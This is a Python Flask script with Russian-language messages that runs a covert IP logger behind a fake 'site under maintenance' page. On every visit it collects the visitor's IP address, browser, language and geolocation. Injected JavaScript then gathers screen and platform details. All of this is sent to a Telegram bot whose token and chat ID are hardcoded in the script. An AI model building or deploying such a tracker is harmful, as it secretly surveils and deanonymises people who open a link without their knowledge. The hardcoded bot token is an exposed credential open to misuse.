from flask import Flask, request
import requests
import json

app = Flask(name)

TOKEN = "8839750399:AAEYXRzgs9lAqpGXkbFrhVCwaTiprIuuC38"
CHAT_ID = "1838683997"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            return f"Страна: {data.get('country')}\nГород: {data.get('city')}\nПровайдер: {data.get('isp')}"
    except:
        pass
    return "Не удалось определить"

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    lang = request.headers.get("Accept-Language")
    
    geo = get_geo(ip)
    
    msg = f"""🚨 НОВЫЙ ЗАХОД, БЛЯ! 🚨

📡 IP: {ip}
🔍 Браузер: {ua}
🗣 Язык: {lang}
🌍 {geo}
"""
    
    send_telegram(msg)
    
    return """
    <html>
    <head><title>Загрузка...</title></head>
    <body>
    <h1>Сайт на ремонте</h1>
    <script>
    fetch('/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            screen: screen.width + 'x' + screen.height,
            battery: navigator.userAgent,
            platform: navigator.platform
        })
    });
    </script>
    </body>
    </html>
    """

@app.route("/log", methods=["POST"])
def log():
    data = request.json
    if data:
        msg = f"📱 Доп данные:\nЭкран: {data.get('screen')}\nПлатформа: {data.get('platform')}"
        send_telegram(msg)
    return "OK"

app.run(host="0.0.0.0", port=10000)
